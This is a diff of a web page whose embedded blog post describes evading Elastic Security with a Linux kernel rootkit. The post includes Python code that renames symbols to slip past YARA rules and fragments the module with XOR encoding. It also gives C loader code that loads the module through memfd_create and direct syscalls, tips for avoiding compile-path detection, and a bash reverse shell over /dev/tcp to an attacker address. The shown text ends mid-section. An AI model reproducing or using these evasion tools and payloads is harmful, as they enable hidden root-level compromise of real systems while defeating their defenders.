@@ -1,64 +1,158 @@
 <!DOCTYPE html>
-<html lang="en" dir="ltr">
-<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<meta name="robots" content="index, follow">
+<html lang="en" dir="auto">
 
-<title>Evading Elastic Security: Linux Rootkit Detection Bypass · 0xMatheuZ</title>
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Evading Elastic Security: Linux Rootkit Detection Bypass | 0xMatheuZ</title>
+<meta name="keywords" content="Evasion">
 <meta name="description" content="Bypassing YARA rules and behavioral detection through symbol randomization, module fragmentation, XOR encoding, and ICMP reverse shell staging">
-<meta name="author" content="0xMatheuZ"><meta name="keywords" content="Evasion">
+<meta name="author" content="0xMatheuZ">
 <link rel="canonical" href="http://localhost:1313/hacking/bypassing-elastic/">
-<meta property="og:title" content="Evading Elastic Security: Linux Rootkit Detection Bypass · 0xMatheuZ">
-<meta property="og:description" content="Bypassing YARA rules and behavioral detection through symbol randomization, module fragmentation, XOR encoding, and ICMP reverse shell staging">
-<meta property="og:type" content="article">
-<meta property="og:url" content="http://localhost:1313/hacking/bypassing-elastic/">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:site" content="@MatheuzSecurity">
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,400;0,500;0,700;1,400&display=swap" rel="stylesheet">
-<link rel="stylesheet" href="/css/main.min.1bc67ffb4441d0e85aecd23bda1eb9c0f69c871ef26d2a8dc539665adbf80152.css" integrity="sha256-G8Z/&#43;0RB0Oha7NI72h65wPachx7ybSqNxTlmWtv4AVI=">
-<link rel="icon" href="/img/0xm-badge.png">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.cd7709143dbfd8231591575aa10b412203641a992e62ac224a96389d247d02ea.css" integrity="sha256-zXcJFD2/2CMVkVdaoQtBIgNkGpkuYqwiSpY4nSR9Auo=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
 <meta name="theme-color" content="#06070b">
+<meta name="msapplication-TileColor" content="#06070b">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/hacking/bypassing-elastic/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript><link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<meta property="og:title" content="Evading Elastic Security: Linux Rootkit Detection Bypass" />
+<meta property="og:description" content="Bypassing YARA rules and behavioral detection through symbol randomization, module fragmentation, XOR encoding, and ICMP reverse shell staging" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://localhost:1313/hacking/bypassing-elastic/" /><meta property="og:image" content="https://i.imgur.com/5vHDN0B.png" /><meta property="article:section" content="hacking" />
+<meta property="article:published_time" content="2025-10-30T14:15:09-04:00" />
+<meta property="article:modified_time" content="2025-10-30T14:15:09-04:00" /><meta property="og:site_name" content="0xMatheuZ" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://i.imgur.com/5vHDN0B.png"/>
+
+<meta name="twitter:title" content="Evading Elastic Security: Linux Rootkit Detection Bypass"/>
+<meta name="twitter:description" content="Bypassing YARA rules and behavioral detection through symbol randomization, module fragmentation, XOR encoding, and ICMP reverse shell staging"/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Hacking",
+      "item": "http://localhost:1313/hacking/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Evading Elastic Security: Linux Rootkit Detection Bypass",
+      "item": "http://localhost:1313/hacking/bypassing-elastic/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Evading Elastic Security: Linux Rootkit Detection Bypass",
+  "name": "Evading Elastic Security: Linux Rootkit Detection Bypass",
+  "description": "Bypassing YARA rules and behavioral detection through symbol randomization, module fragmentation, XOR encoding, and ICMP reverse shell staging",
+  "keywords": [
+    "Evasion"
+  ],
+  "articleBody": " Stealthy Kernel Rootkit: https://github.com/MatheuZSecurity/Singularity\nRootkit Researchers: https://discord.gg/66N5ZQppU7\nIntroduction Security solutions continue to intensify. Modern EDRs like Elastic Security, integrated with Elastic Defend, employ multiple detection layers including YARA signatures and behavioral analysis to identify Linux kernel rootkits, triggering 26+ alerts on a single malicious module.\nThis article demonstrates how to systematically evade these defenses. We present a comprehensive case study of developing a Linux rootkit that successfully bypasses Elastic Security’s detection mechanisms through obfuscation, fragmentation, and staged execution techniques. All content is strictly for educational purposes only.\nTable of Contents Introduction Understanding the Threat Landscape: Elastic YARA Rules Primary Detection Rules Detection Signature Analysis The Singularity Rootkit: Capabilities Overview Core Features Evasion Technique 1: Symbol Name Randomization The Problem The Solution: Intelligent Name Randomization Evasion Technique 2: Module Fragmentation The Problem The Solution: Fragment + XOR Encoding + In-Memory Loading Custom Loader via memfd_create Evasion Technique 3: Ftrace Helper Obfuscation The Problem The Solution: Rename Ftrace Framework Functions Build Pipeline: Automated Obfuscation Workflow Final Test: Successful Evasion Bonus: Compilation Path Detection Bypass Bonus 2: Bypassing Elastic Behavioral Detection for Reverse Shells Conclusion Understanding the Threat Landscape: Elastic YARA Rules In a default environment with the Elastic agent installed, attempting to compile and load the Singularity rootkit results in immediate detection and files removed. The kernel object is automatically deleted and isolated in quarantine before it can be loaded into the kernel.\nThere were approximately 26 detections.\nUpon investigation, I identified the specific Elastic YARA rules detecting our rootkit:\nPrimary Detection Rules Linux_Rootkit_BrokePKG.yar\nLinux_Rootkit_Generic.yar\nLinux_Rootkit_Generic_61229bdf - Detects common rootkit patterns and function names Linux_Rootkit_Generic_482bca48 - Targets suspicious prefixes and hook patterns Linux_Rootkit_Generic_d0c5cfe0 - Detects initialization and hooking combinations Linux_Rootkit_Generic_f07bcabe - Identifies ftrace helper functions Linux_Rootkit_Generic_5d17781b - Targets license strings combined with kallsyms Linux_Rootkit_BrokePKG_7b7d4581 - Specific patterns from known rootkits Detection Signature Analysis Generic Rootkit Detection (61229bdf) Targets: hide_module, hook_getdents, orig_kill, fake_tcp4_seq_show, etc. Condition: 4 or more matching strings Total patterns: 57 distinct function names Hook Pattern Detection (482bca48) System strings: sys_call_table, kallsyms_lookup_name, kprobe Rootkit prefixes: rootkit, hide_, hacked_, fake_, hooked_ Hook suffixes: _getdents, _kill, _tcp4_seq_show, _udp4_seq_show Condition: 3 system strings AND (all prefixes OR 3 prefixes + 5 hooks) License String Detection (5d17781b) Targets: kallsyms_lookup_name_t + \"license=GPL\" Condition: Both strings must be present Purpose: Detects ftrace-based rootkits using kallsyms Ftrace Helper Detection (f07bcabe) Targets: - fh_install_hook - fh_remove_hook - fh_resolve_hook_address Condition: 2 or more matching strings BrokePKG Specific Detection (7b7d4581) License strings: - author=R3tr074 - name=brokepkg - description=Rootkit - license=GPL Specific strings: - brokepkg - brokepkg: module revealed - br0k3_n0w_h1dd3n Hook patterns: - nf_inet_hooks - ftrace_hook - hook_getdents - hook_kill - orig_tcp4_seq_show Condition: 3 license strings OR 2 specific strings OR 4 hook patterns Since our rootkit utilizes ftrace for syscall hooking, it naturally contains many of these patterns. The challenge becomes: how do we maintain functionality while evading static signature detection?\nThe Singularity Rootkit: Capabilities Overview Source: https://github.com/MatheuZSecurity/Singularity\nBefore diving into evasion techniques, let’s understand what the Singularity rootkit accomplishes:\nCore Features Process Hiding: Hides processes from /proc. File and Directory Hiding: Conceals files matching specific patterns (singularity, obliviate, matheuz, zer0t, etc.) Network Hiding: Hides TCP connections on port 8081 from netstat and packet capture tools Privilege Escalation: Provides root access via signal 59 (kill -59 ) or environment variable (MAGIC=mtz) ICMP Backdoor: Triggers reverse shell via magic ICMP packets (sequence 1337) Anti-Analysis Features:\nBlocks BPF programs and tracing Prevents ftrace manipulation by other users Disables module loading via init_module/finit_module hooks Filters /proc/kallsyms, /proc/modules, and tracefs Taint Clearing: Resets kernel taint flags to hide unsigned module loading Log Sanitization: Filters kernel logs (dmesg, /var/log/kern.log) to remove traces of the rootkit Module Stealth: Self-hiding from lsmod and /sys/module directory Evasion Technique 1: Symbol Name Randomization The Problem Rootkits typically use predictable naming patterns that become signatures:\nhook_getdents64 fake_tcp4_seq_show hide_module orig_kill hacked_open hooked_read Elastic’s YARA rules (61229bdf, 482bca48, d0c5cfe0) specifically target these prefixes:\n$rk1 = \"rootkit\" $rk2 = \"hide_\" $rk3 = \"hacked_\" $rk4 = \"fake_\" $rk5 = \"hooked_\" $hook1 = \"_getdents\" $hook2 = \"_kill\" $hook3 = \"_tcp4_seq_show\" The Solution: Intelligent Name Randomization Our Python obfuscator generates kernel-like generic names that blend in with legitimate kernel code:\ndef _generate_random_name(self) -\u003e str: \"\"\"Generates random name that avoids YARA patterns\"\"\" # Avoid suspicious prefixes: hook_, fake_, hide_, hacked_, hooked_, orig_ # Use generic names that look legitimate prefixes = ['sys', 'kern', 'dev', 'mm', 'fs', 'net', 'proc', 'sched'] suffixes = ['handler', 'helper', 'worker', 'ops', 'func', 'entry', 'cb'] prefix = random.choice(prefixes) suffix = random.choice(suffixes) middle = ''.join(random.choices(string.ascii_lowercase, k=random.randint(3, 6))) return f\"{prefix}_{middle}_{suffix}\" Key Features No suspicious prefixes (hook_, fake_, hide_) Looks like legitimate kernel code Maintains internal consistency via mapping file Protects kernel API calls from renaming Protected Names The obfuscator maintains a whitelist of kernel API functions that must NOT be renamed:\ndef _get_protected_names(self) -\u003e Set[str]: \"\"\"Names from kernel that should NOT be changed\"\"\" return { # Basic C types 'int', 'void', 'long', 'char', 'size_t', 'ssize_t', # Essentials 'module_init', 'module_exit', 'THIS_MODULE', 'current', 'kmalloc', 'kfree', 'printk', 'pr_debug', 'copy_from_user', 'copy_to_user', 'fget', 'fput', 'kernel_read', # Structures 'pt_regs', 'file', 'task_struct', 'sk_buff', # Entry points 'main', 'init', 'exit', } Function Name Extraction The obfuscator scans source files for function definitions using multiple regex patterns:\nself.function_patterns = [ r'\\bnotrace\\s+(?:static\\s+)?(?:int|void|long|bool|ssize_t|asmlinkage)\\s+(\\w+)\\s*\\(', r'\\bstatic\\s+(?:notrace\\s+)?(?:int|void|long|bool|ssize_t|asmlinkage)\\s+(\\w+)\\s*\\(', r'\\bstatic\\s+asmlinkage\\s+\\w+\\s+(\\w+)\\s*\\(', r'\\basmlinkage\\s+\\w+\\s+\\*?\\(?\\*?(\\w+)\\)?', r'\\b(\\w+_init)\\s*\\(\\s*void\\s*\\)', r'\\b(\\w+_exit)\\s*\\(\\s*void\\s*\\)', r'\\bHOOK\\s*\\([^,]+,\\s*(\\w+)\\s*,', r'\\btypedef\\s+[^;]+\\s+(\\w+_t)\\s*;', ] Example Transformation Before:\n// modules/hiding_directory.c static notrace long hook_getdents64(const struct pt_regs *regs) { long res = orig_getdents64(regs); // ... } static notrace long hook_getdents(const struct pt_regs *regs) { long res = orig_getdents(regs); // ... } After:\n// obfuscated/modules/hiding_directory.c static notrace long sys_abjker_handler(const struct pt_regs *regs) { long res = kern_wopqls_helper(regs); // ... } static notrace long fs_tnmqlk_ops(const struct pt_regs *regs) { long res = net_xzpnrm_func(regs); // ... } Implementation Details def _replace_in_content(self, content: str, mapping: Dict[str, str]) -\u003e str: \"\"\"Replace names in content\"\"\" modified = content # Sort by descending length to avoid partial substitutions sorted_items = sorted(mapping.items(), key=lambda x: len(x[0]), reverse=True) for old_name, new_name in sorted_items: # Use word boundary for exact substitution pattern = r'\\b' + re.escape(old_name) + r'\\b' modified = re.sub(pattern, new_name, modified) return modified The key insight: we sort by length descending to prevent partial matches. For example, if we have both hook_kill and hook_kill_ex, we must replace hook_kill_ex first to avoid breaking it into sys_abc_handler_ex.\nEvasion Technique 2: Module Fragmentation The Problem EDR solutions scan loaded kernel modules primarily on disk. A monolithic .ko file presents a single attack surface that’s easy to analyze:\nSignature scanning of the entire module on disk Static analysis of ELF structure Symbol table enumeration String pattern detection (including “GPL”, “kallsyms_lookup_name”, etc.) The Solution: Fragment + XOR Encoding + Ephemeral In-Memory Loading We split the compiled module into encrypted chunks that are only reassembled in memory during loading. This technique breaks static disk-based analysis while maintaining functionality.\nHow This Evades Detection The evasion works through a multi-layered approach:\nDisk-Based YARA Evasion: XOR encoding breaks string signatures in stored fragments Ephemeral Reconstruction: The complete module exists in plaintext only briefly in a temporary memfd Self-Hiding Post-Load: The rootkit immediately conceals itself after loading Important Technical Note: After XOR decoding during the load process, strings like “GPL” and “kallsyms_lookup_name” are restored to plaintext in memory. However, Elastic’s YARA rules primarily scan files on disk, not ephemeral memory structures. The combination of:\nXOR-encoded fragments on disk (unreadable to YARA) Millisecond-duration plaintext in anonymous memfd (difficult to scan) Immediate self-hiding after module load (invisible to subsequent analysis) …creates an effective evasion without requiring permanent string obfuscation in memory.\nFragmentation Pipeline: def fragment(self, chunk_size: int = 65536, encode: bool = True) -\u003e List[bytes]: \"\"\" Fragment the .ko into chunks Args: chunk_size: Size of each fragment (default: 64KB) encode: If True, apply XOR encoding Returns: List of fragments \"\"\" print(f\"\\n[*] Fragmenting: {self.ko_path}\") print(f\" Chunk size: {chunk_size} bytes\") # Read the .ko file with open(self.ko_path, 'rb') as f: ko_data = f.read() original_size = len(ko_data) print(f\"[+] Original size: {original_size} bytes\") # Generate random XOR key xor_key = os.urandom(16) if encode else b'\\x00' * 16 # Fragment fragments = [] num_chunks = (original_size + chunk_size - 1) // chunk_size for i in range(num_chunks): start = i * chunk_size end = min(start + chunk_size, original_size) chunk = ko_data[start:end] # Apply encoding if necessary if encode: chunk = self._xor_encode(chunk, xor_key) fragments.append(chunk) checksum = self._calculate_checksum(chunk) print(f\"[+] Fragment {i+1}/{num_chunks}: {len(chunk)} bytes (SHA256: {checksum[:16]}...)\") self.fragments = fragments # Metadata self.metadata = { 'original_filename': self.ko_path.name, 'original_size': original_size, 'num_fragments': len(fragments), 'chunk_size': chunk_size, 'encoded': encode, 'xor_key': xor_key.hex() if encode else None, 'checksums': [self._calculate_checksum(f) for f in fragments] } return fragments XOR Encoding We use a simple but effective XOR cipher with a random 16-byte key:\ndef _xor_encode(self, data: bytes, key: bytes) -\u003e bytes: \"\"\"Simple XOR encoding for obfuscation\"\"\" encoded = bytearray() key_len = len(key) for i, byte in enumerate(data): encoded.append(byte ^ key[i % key_len]) return bytes(encoded) While XOR is cryptographically weak, it serves our purpose for disk-based evasion:\nBreaks signature matching in files stored on disk Fast to encode/decode Minimal overhead Easy to implement in C loader Evasion Layer Breakdown ┌─────────────────────────────────────────────────────────────────┐ │ LAYER 1: Fragments on Disk (XOR Encoded) │ ├─────────────────────────────────────────────────────────────────┤ │ Status: YARA cannot detect signatures │ │ Reason: All bytes are XOR'ed, \"GPL\" appears as random bytes │ │ │ │ # Before encoding │ │ strings singularity.ko | grep \"GPL\" │ │ license=GPL │ │ │ │ # After encoding │ │ strings fragments/chunk_000.bin | grep \"GPL\" │ │ (no results - bytes are obfuscated) │ └─────────────────────────────────────────────────────────────────┘ ┌─────────────────────────────────────────────────────────────────┐ │ LAYER 2: Ephemeral memfd (Plaintext - Milliseconds) │ ├─────────────────────────────────────────────────────────────────┤ │ Status: Strings are restored to plaintext │ │ Reason: XOR decode happens during reconstruction │ │ │ │ Timeline: │ │ T+0ms: memfd created │ │ T+5ms: fragments decoded and written │ │ T+10ms: finit_module() called │ │ T+15ms: memfd closed and deleted │ │ │ │ Detection Window: ~15 milliseconds │ │ Elastic Challenge: Must scan anonymous memfd in real-time │ └─────────────────────────────────────────────────────────────────┘ ┌─────────────────────────────────────────────────────────────────┐ │ LAYER 3: Loaded Module (Plaintext but Hidden) │ ├─────────────────────────────────────────────────────────────────┤ │ Status: Strings exist in kernel memory │ │ Reason: Module is loaded normally │ │ │ │ Rootkit Self-Hiding: │ │ ✓ Hidden from lsmod │ │ ✓ Hidden from /sys/module │ │ ✓ Filters /proc/kallsyms │ │ ✓ Filters /proc/modules │ │ ✓ Blocks BPF and tracing │ │ │ │ Result: Invisible to analysis tools │ └─────────────────────────────────────────────────────────────────┘ Why Elastic Doesn’t Detect This YARA primarily scans disk files\nFragments are XOR’ed and broken up No single file contains the complete signature pattern Original .ko is deleted after fragmentation memfd is ephemeral and anonymous\nExists for ~15 milliseconds during loading No persistent path in filesystem Difficult to scan in real-time Post-load self-hiding\nModule immediately conceals itself Blocks subsequent inspection attempts Filtering prevents memory analysis Resulting Structure fragments/ ├── chunk_000.bin # XOR-encoded fragment (64KB) ├── chunk_001.bin # XOR-encoded fragment (64KB) ├── chunk_002.bin # XOR-encoded fragment (64KB) ├── ... ├── chunk_N.bin # Final fragment (variable size) ├── metadata.json # Contains XOR key and checksums └── reconstruct.sh # Automated reconstruction script Metadata Format { \"original_filename\": \"singularity.ko\", \"original_size\": 245632, \"num_fragments\": 4, \"chunk_size\": 65536, \"encoded\": true, \"xor_key\": \"a3f5b2c8e1d4f7a6b9c2e5f8a1d4b7c0\", \"checksums\": [ \"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855\", \"cf83e1357eefb8bdf1542850d66d8007d620e4050b5715dc83f4a921d36ce9ce\", \"2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae\", \"fcde2b2edba56bf408601fb721fe9b5c338d10ee429ea04fae5511b68fbf8fb9\" ] } Custom Loader via memfd_create Instead of using insmod or modprobe, we implement a custom loader that:\nReads encrypted fragments from disk Decodes them in memory Creates an anonymous memory file descriptor Writes the reconstructed module to the memory FD Loads the module via direct syscall Immediately closes the memfd (auto-deleted) Loader Architecture /* * Singularity Loader * * 1. Uses 32-bit syscall (finit_module) via inline assembly * 2. Reconstructs .ko from fragments in memory * 3. Decodes XOR encoding (strings restored to plaintext) * 4. Uses memfd_create for ephemeral loading * 5. Direct syscall to avoid libc wrapper * 6. memfd exists only during loading (~15ms) * * Compile: gcc -o loader loader.c -static * Usage: ./loader fragments/ */ #define _GNU_SOURCE #include #include #include #include #include #include #include #include #include #include // Syscall numbers #define __NR_finit_module 313 #define __NR_memfd_create 319 // Settings #define MAX_FRAGMENTS 256 #define MAX_CHUNK_SIZE (1024 * 1024) // 1MB #define XOR_KEY_SIZE 16 #define MODULE_FLAGS 0 Direct Syscall Implementation To avoid EDR hooking of libc functions, we use inline assembly for direct syscalls:\n// Direct 64-bit syscall static inline long syscall_direct_64(long number, long arg1, long arg2, long arg3) { long ret; register long r10 asm(\"r10\") = arg3; asm volatile( \"syscall\" : \"=a\" (ret) : \"0\" (number), \"D\" (arg1), \"S\" (arg2), \"d\" (r10) : \"rcx\", \"r11\", \"memory\" ); return ret; } // Direct 32-bit syscall static inline long syscall_direct_32(long number, long arg1, long arg2, long arg3) { long ret; asm volatile( \"int $0x80\" : \"=a\" (ret) : \"0\" (number), \"b\" (arg1), \"c\" (arg2), \"d\" (arg3) : \"memory\" ); return ret; } Why This Works:\n32-bit Syscall: The int $0x80 interface is legacy and less monitored than modern syscall instruction Memory File Descriptor Creation static int create_memfd(const char *name) { long fd = syscall_direct_64(__NR_memfd_create, (long)name, 0, 0); if (fd \u003c 0) { fprintf(stderr, \"[!] memfd_create failed: %s\\n\", strerror(-fd)); return -1; } printf(\"[+] memfd created: fd=%ld (%s)\\n\", fd, name); return (int)fd; } memfd_create creates an anonymous file that:\nExists only in memory (tmpfs) Automatically deleted when all file descriptors are closed Can be passed to finit_module() like a regular file Contains plaintext .ko after XOR decode (but only temporarily) Remember that EDRs can monitor memfd_create() calls, and it can also be detected in /proc//fd/ during the brief loading window.\nXOR Decoder static void xor_decode(uint8_t *data, size_t len, const uint8_t *key, size_t key_len) { for (size_t i = 0; i \u003c len; i++) { data[i] ^= key[i % key_len]; } } Critical Note: This decode operation restores all strings to plaintext, including “GPL” and “kallsyms_lookup_name”. The evasion relies on the ephemeral nature of this plaintext state, not permanent obfuscation.\nFragment Loading static int load_fragments(const char *dir_path, Fragment *fragments, int *num_fragments) { DIR *dir = opendir(dir_path); if (!dir) { perror(\"[!] opendir\"); return -1; } struct dirent *entry; int count = 0; printf(\"[*] Scanning fragments in: %s\\n\", dir_path); while ((entry = readdir(dir)) != NULL \u0026\u0026 count \u003c MAX_FRAGMENTS) { // Look for chunk_XXX.bin if (strncmp(entry-\u003ed_name, \"chunk_\", 6) == 0 \u0026\u0026 strstr(entry-\u003ed_name, \".bin\") != NULL) { char filepath[512]; snprintf(filepath, sizeof(filepath), \"%s/%s\", dir_path, entry-\u003ed_name); // Extract index int idx = atoi(entry-\u003ed_name + 6); // Read fragment FILE *f = fopen(filepath, \"rb\"); if (!f) { fprintf(stderr, \"[!] Error opening %s\\n\", filepath); continue; } fseek(f, 0, SEEK_END); long fsize = ftell(f); fseek(f, 0, SEEK_SET); uint8_t *data = malloc(fsize); if (!data) { fclose(f); continue; } size_t read_bytes = fread(data, 1, fsize, f); fclose(f); if (read_bytes != fsize) { free(data); continue; } fragments[count].data = data; fragments[count].size = fsize; fragments[count].index = idx; count++; printf(\"[+] Fragment %d: %s (%ld bytes)\\n\", idx, entry-\u003ed_name, fsize); } } closedir(dir); *num_fragments = count; // Sort fragments by index for (int i = 0; i \u003c count - 1; i++) { for (int j = 0; j \u003c count - i - 1; j++) { if (fragments[j].index \u003e fragments[j + 1].index) { Fragment temp = fragments[j]; fragments[j] = fragments[j + 1]; fragments[j + 1] = temp; } } } return 0; } Module Loading static int load_module_stealthy(int fd, const char *params, int flags) { printf(\"[*] Loading module via direct syscall...\\n\"); // Try 32-bit syscall first (more stealthy) long ret = syscall_direct_32(__NR_finit_module, fd, (long)params, flags); if (ret \u003c 0) { // Fallback to 64-bit ret = syscall_direct_64(__NR_finit_module, fd, (long)params, flags); } if (ret \u003c 0) { fprintf(stderr, \"[!] finit_module failed: %s\\n\", strerror(-ret)); return -1; } printf(\"[+] Module loaded successfully!\\n\"); return 0; } Complete Loading Workflow int main(int argc, char *argv[]) { // 1. Load fragments Fragment fragments[MAX_FRAGMENTS] = {0}; int num_fragments = 0; load_fragments(fragments_dir, fragments, \u0026num_fragments); // 2. Parse metadata (get XOR key) uint8_t xor_key[XOR_KEY_SIZE] = {0}; int is_encoded = 0; parse_metadata(fragments_dir, xor_key, \u0026is_encoded); // 3. Create memfd (anonymous, temporary) int memfd = create_memfd(\"module\"); // 4. Reconstruct module in memfd // IMPORTANT: After this step, strings are in PLAINTEXT in memfd for (int i = 0; i \u003c num_fragments; i++) { uint8_t *data = fragments[i].data; size_t size = fragments[i].size; // Decode if necessary (restores plaintext) if (is_encoded) { xor_decode(data, size, xor_key, XOR_KEY_SIZE); } // Write to memfd (plaintext .ko now in memory) write(memfd, data, size); } // Reset FD position lseek(memfd, 0, SEEK_SET); // 5. Load module via direct syscall // Plaintext .ko exists in memfd for ~15ms during this call load_module_stealthy(memfd, module_params, MODULE_FLAGS); // 6. Cleanup (memfd automatically deleted) // After this, the only plaintext copy is in kernel memory // where the rootkit's self-hiding protects it close(memfd); return 0; } Advantages of This Approach:\nNo .ko file on disk after compilation Fragments can be deleted after loading Plaintext .ko exists only in ephemeral memfd (~15ms window) Post-load self-hiding prevents subsequent analysis Static Analysis Resistance:\nIndividual fragments don’t match YARA signatures (XOR’ed) No complete ELF structure visible on disk Plaintext reconstruction happens in anonymous, temporary memfd Loaded module immediately hides itself from inspection tools Detection Challenges for EDR:\nMust scan ephemeral memfd in real-time (15ms window) Must bypass rootkit’s anti-analysis features post-load Disk-based YARA scanning ineffective against XOR’ed fragments Evasion Technique 3: Ftrace Helper Obfuscation The Problem Elastic’s rule f07bcabe targets ftrace-based rootkits by detecting function names:\n$str1 = \"fh_install_hook\" $str2 = \"fh_remove_hook\" $str3 = \"fh_resolve_hook_address\" Condition: 2 of them These are standard function names in ftrace hooking frameworks, making them easy signatures.\nThe Solution: Rename Ftrace Framework Functions Our obfuscator treats ftrace helper functions like any other custom function:\nBefore:\n// ftrace/ftrace_helper.c notrace int fh_resolve_hook_address(struct ftrace_hook *hook) { hook-\u003eaddress = kallsyms_lookup_name(hook-\u003ename); // ... } notrace int fh_install_hook(struct ftrace_hook *hook) { int err = fh_resolve_hook_address(hook); // ... } notrace void fh_remove_hook(struct ftrace_hook *hook) { int err = unregister_ftrace_function(\u0026hook-\u003eops); // ... } notrace int fh_install_hooks(struct ftrace_hook *hooks, size_t count) { size_t i; int err; for (i = 0; i \u003c count; i++) { err = fh_install_hook(\u0026hooks[i]); // ... } } notrace void fh_remove_hooks(struct ftrace_hook *hooks, size_t count) { size_t i; for (i = 0; i \u003c count; i++) fh_remove_hook(\u0026hooks[i]); } Example after Obfuscation:\n// obfuscated/ftrace/ftrace_helper.c notrace int kern_xploqm_helper(struct ftrace_hook *hook) { hook-\u003eaddress = kallsyms_lookup_name(hook-\u003ename); // ... } notrace int sys_zmnpqr_ops(struct ftrace_hook *hook) { int err = kern_xploqm_helper(hook); // ... } notrace void net_abqzpx_handler(struct ftrace_hook *hook) { int err = unregister_ftrace_function(\u0026hook-\u003eops); // ... } notrace int fs_klmnop_worker(struct ftrace_hook *hooks, size_t count) { size_t i; int err; for (i = 0; i \u003c count; i++) { err = sys_zmnpqr_ops(\u0026hooks[i]); // ... } } notrace void proc_qwerty_entry(struct ftrace_hook *hooks, size_t count) { size_t i; for (i = 0; i \u003c count; i++) net_abqzpx_handler(\u0026hooks[i]); } The obfuscated names maintain the ftrace hooking functionality while breaking the specific signature patterns that Elastic Security looks for. The functions remain fully operational since the kernel doesn’t care about function names in loaded modules.\nBuild Pipeline: Automated Obfuscation Workflow Our automated build system chains all evasion techniques in a reproducible pipeline:\n#!/bin/bash set -e echo \"[*] Singularity Build\" rm -rf obfuscated fragments loader singularity_payload* # 1. Obfuscate and compile echo \"[1] Obfuscating and compiling...\" python3 obfuscator/name_randomizer.py --input . --output obfuscated cd obfuscated \u0026\u0026 make \u0026\u0026 cd .. # 2. Fragment the .ko echo \"[2] Fragmenting module...\" python3 obfuscator/ko_fragmenter.py --input obfuscated/singularity.ko --output fragments # 3. CLEANUP - Remove obfuscated directory completely echo \"[4] Cleaning build artifacts...\" rm -rf obfuscated echo \"[+] Build complete! Final files:\" echo \" - fragments/ (module fragments)\" echo \" - loader\" echo \" - NO obfuscated code left behind\" Final Test: Successful Evasion In the screenshot we run the build.sh and we can see the saved kernel module fragments and all obfuscated.\nNow, using the loader, we can load Singularity without being detected.\nTesting one of singularity features hiding our process and become root.\nWith these techniques, we successfully bypass Elastic Security’s static detection mechanisms.\nBonus: Compilation Path Detection Bypass By default, Elastic Security actively monitors compilation activity in /dev/shm and automatically terminates the process when it detects suspicious operations like compiling loader.c or the Singularity rootkit.\nSimple Evasion Technique:\nThis detection can be easily bypassed by compiling in alternative directories that are less monitored:\n# Instead of /dev/shm (monitored): gcc -o /dev/shm/loader loader.c # Detected and killed # Use alternative paths (less scrutinized): gcc -o /tmp/loader loader.c # Bypasses detection gcc -o /var/tmp/loader loader.c # Bypasses detection Why This Works:\nElastic’s behavioral detection rules prioritize monitoring /dev/shm due to its common use in malware. Alternative writable directories like /tmp and /var/tmp receive less aggressive monitoring, allowing the compilation and execution of the loader without triggering automated termination.\nBonus 2: Bypassing Elastic Behavioral Detection for Reverse Shells The latest version of Singularity triggers a reverse shell via ICMP packet hooking. While the previous techniques bypassed static YARA signatures, Elastic’s behavioral detection rules caught the reverse shell execution.\nThe Detection Problem Elastic triggered two behavioral alerts:\n“Suspicious Execution via setsid and nohup” (Risk: 73) “Shell Command Execution via Kworker” (Risk: 99) Elastic’s Behavioral Rules Rule 1: Detects setsid/nohup + /dev/tcp/* patterns\nRule 2: Detects shell processes using /dev/tcp/ or /dev/udp/\nBoth rules automatically kill the process on detection.\nRule 2 Detection Logic:\nprocess where event.action == \"exec\" and process.name in (\"sh\", \"bash\", \"zsh\", \"dash\", \"zmodload\") and process.command_line like~ (\"*/dev/tcp/*\", \"*/dev/udp/*\", \"*zsh/net/tcp*\", \"*zsh/net/udp*\") The rule scans the entire command line for /dev/tcp/ patterns, making simple obfuscation ineffective.\nOriginal Detected Code // DETECTED by Elastic snprintf(cmd, sizeof(cmd), \"bash -c '\" \"PID=$$; \" \"kill -59 $PID; \" \"exec -a \\\"%s\\\" /bin/bash \u0026\u003e/dev/tcp/%s/%s 0\u003e\u00261\" \"' \u0026\", PROC_NAME, YOUR_SRV_IP, SRV_PORT); char *argv[] = {\"/usr/bin/setsid\", \"/bin/bash\", \"-c\", cmd, NULL}; Why detected:\nUses setsid command /dev/tcp/ appears in process arguments Shell spawned from kernel worker context Working Evasion: Staged Script Execution The solution is to separate the malicious payload from process arguments by writing the script to disk first, then executing it.\nKey Changes 1. Write the script to disk:\n#define SCRIPT_PATH 